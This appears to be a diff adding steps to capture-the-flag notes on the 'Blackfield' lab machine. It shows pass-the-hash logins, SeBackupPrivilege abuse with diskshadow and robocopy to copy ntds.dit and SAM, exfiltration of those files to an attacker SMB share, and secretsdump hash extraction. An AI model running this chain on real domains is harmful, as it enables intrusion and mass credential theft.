@@ -262,3 +262,93 @@ luid 406458
 crackmapexec winrm $IP -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
 evil-winrm -i $IP -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
 ```
+
+### Kerberoasting the service account(svc_backup) since SeBackupPrivileges Enabled
+```bash
+python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip $IP -hashes :9658d1d1dcd9250115e2205d9f48400d 'BLACKFIELD.LOCAL/svc_backup' -request
+
+python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip $IP -hashes '':9658d1d1dcd9250115e2205d9f48400d 'BLACKFIELD.LOCAL/svc_backup' -request
+```
+No entries found!
+
+### Check if it whether kerberoastable or not, which should be done first.. lol
+```winrm
+setspn -T blackfield.local -F -Q */*
+```
+```bash result
+*Evil-WinRM* PS C:\Users\svc_backup\Desktop> setspn -T blackfield.local -F -Q */*
+Checking forest DC=BLACKFIELD,DC=local
+CN=DC01,OU=Domain Controllers,DC=BLACKFIELD,DC=local
+        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC01.BLACKFIELD.local
+        ldap/DC01.BLACKFIELD.local/ForestDnsZones.BLACKFIELD.local
+        ldap/DC01.BLACKFIELD.local/DomainDnsZones.BLACKFIELD.local
+        TERMSRV/DC01
+        TERMSRV/DC01.BLACKFIELD.local
+        DNS/DC01.BLACKFIELD.local
+        GC/DC01.BLACKFIELD.local/BLACKFIELD.local
+        RestrictedKrbHost/DC01.BLACKFIELD.local
+        RestrictedKrbHost/DC01
+        RPC/2a754031-e5c5-4e88-bb09-09aae693753c._msdcs.BLACKFIELD.local
+        HOST/DC01/BLACKFIELD
+        HOST/DC01.BLACKFIELD.local/BLACKFIELD
+        HOST/DC01
+        HOST/DC01.BLACKFIELD.local
+        HOST/DC01.BLACKFIELD.local/BLACKFIELD.local
+        E3514235-4B06-11D1-AB04-00C04FC2DCD2/2a754031-e5c5-4e88-bb09-09aae693753c/BLACKFIELD.local
+        ldap/DC01/BLACKFIELD
+        ldap/2a754031-e5c5-4e88-bb09-09aae693753c._msdcs.BLACKFIELD.local
+        ldap/DC01.BLACKFIELD.local/BLACKFIELD
+        ldap/DC01
+        ldap/DC01.BLACKFIELD.local
+        ldap/DC01.BLACKFIELD.local/BLACKFIELD.local
+CN=krbtgt,CN=Users,DC=BLACKFIELD,DC=local
+        kadmin/changepw
+
+Existing SPN found!
+```
+Not kerberoastable since no service accounts have SPNs assigned to them(the users you have and the Backup Operator user e.g. backup_svc). Just the DC and krbtgt.
+
+### An Easier Way to extract a copy of the local SAM file hash
+```winrm
+reg save hklm\sam C:\temp\SAM
+reg save hklm\system C:\temp\system
+```
+
+nope reg.exe : ERROR: The system was unable to find the specified registry key or value.
+
+### Extracting a copy of the Local SAM using diskshadow.exe and robocopy
+```bash
+cat alvin.dsh
+
+❯ unix2dos alvin.dsh
+unix2dos: converting file alvin.dsh to DOS format...
+```
+
+mv to c:\windows\temp first OR set metadata in dsh. Details in medium https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960
+
+```winrm
+upload alvin.dsh
+diskshadow /s alvin.dsh
+robocopy /b z:\windows\ntds . ntds.dit                  # Get ntds.dit or SAM. NTDS.dit contains all domain user hashes
+robocopy /b z:\windows\System32\Config . SAM            # Get ntds.dit or SAM. SAM contains local user hashed
+robocopy /b z:\windows\System32\Config . SYSTEM         # Get SYSTEM !!
+```
+
+### Download them
+```bash
+sudo /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support -user as -password as
+```
+
+```winrm
+net use \\10.10.16.13\share /u:as as
+copy SYSTEM \\10.10.16.13\share
+copy ntds.dit \\10.10.16.13\share
+copy SAM \\10.10.16.13\share
+```
+
+### Root
+```bash
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -ntds ntds.dit -system SYSTEM local <- this one works
+
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM -system SYSTEM local
+```
